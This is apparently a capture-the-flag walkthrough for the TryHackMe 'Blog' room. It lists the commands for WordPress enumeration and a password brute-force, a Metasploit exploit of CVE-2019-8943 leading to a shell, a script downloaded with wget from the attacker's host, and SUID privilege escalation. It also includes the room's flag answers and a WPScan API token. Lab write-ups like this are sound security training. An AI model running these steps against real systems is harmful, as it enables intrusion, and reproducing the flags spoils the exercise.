---
description: https://tryhackme.com/room/blog
---

# Blog

![](../../.gitbook/assets/10.10.191.254.png)

## Task 1 Blog

```bash
echo '10.10.191.254 blog.thm' | sudo tee -a /etc/hosts
nmap -n -sV -sC blog.thm
```

![](<../../.gitbook/assets/Screenshot from 2022-03-23 18-11-52.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-23 18-15-02.png>)

```bash
wpscan --url blog.thm -e u
wpscan --url blog.thm -e vt \
       --api-token dakoGZasmsRjcPTs7mfuWqv1dMwhcVoaHba8qnXyXjs
wpscan --url blog.thm --usernames kwheel \
       --passwords /usr/share/wordlists/rockyou.txt -t 64
```

![](<../../.gitbook/assets/Screenshot from 2022-03-23 18-16-16.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-23 18-24-14.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-23 20-12-39.png>)

```bash
msfconsole -q
msf > search CVE-2019-8943
msf > use 0
msf > set RHOST blog.thm
msf > set LHOST 10.6.9.176
msf > set USERNAME kwheel
msf > set PASSWORD cutiepie1
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-23 18-27-11.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-23 20-20-41.png>)

```bash
meterpreter > search -d / -f user.txt
meterpreter > cat /home/bjoel/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-23 20-21-48.png>)

```bash
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
wget http://10.6.9.176/suid3num.py -P /tmp
python /tmp/suid3num.py
```

![](<../../.gitbook/assets/Screenshot from 2022-03-23 20-26-14.png>)

```bash
ltrace /usr/sbin/checker
admin=1 /usr/sbin/checker
find / -type f -name root.txt 2>/dev/null
cat /root/root.txt
find / -type f -name user.txt 2>/dev/null
cat /media/usb/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-23 20-31-44.png>)

#### root.txt

{% hint style="success" %}
`9a0b2b618bef9bfa7ac28c1353d9f318`
{% endhint %}

#### user.txt

{% hint style="success" %}
`c8421899aae571f7af486492b71a8ab7`
{% endhint %}

#### Where was user.txt found?

{% hint style="success" %}
`/media/usb`
{% endhint %}

#### What CMS was Billy using?

{% hint style="success" %}
`WordPress`
{% endhint %}

#### What version of the above CMS was being used?

{% hint style="success" %}
`5.0`
{% endhint %}

## Xmind

{% file src="../../.gitbook/assets/10.10.191.254.xmind" %}
